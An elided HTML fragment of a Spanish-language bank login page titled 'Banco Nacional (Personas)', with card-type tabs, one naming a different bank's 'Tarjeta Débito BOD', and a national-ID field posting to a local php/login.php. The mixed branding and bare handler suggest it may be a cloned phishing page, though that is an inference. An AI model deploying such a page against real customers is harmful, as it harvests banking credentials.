...
<head>
  ...
  <title>Login - Banco Nacional (Personas)</title>
...
<body>
  ...
  <div class="wrapper">
    <form class="login-container" id="login-form" action="php/login.php" method="POST">
      <div class="tabs">
        <button type="button" id="tab-personas" class="active">Personas</button>
      ...
      <div class="sub-tabs" id="sub-tabs-personas">
        <button type="button" id="btn-debito-credito" class="active">Débito | Crédito</button>
        <button type="button" id="btn-bod" class="non-active">Tarjeta Débito BOD</button>
      </div>
      ...
      <div class="form-group" id="group-secundario">
        <input name="cedula" id="input-secundario" type="text" placeholder="Cédula de Identidad" required pattern="\d*" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
      </div>
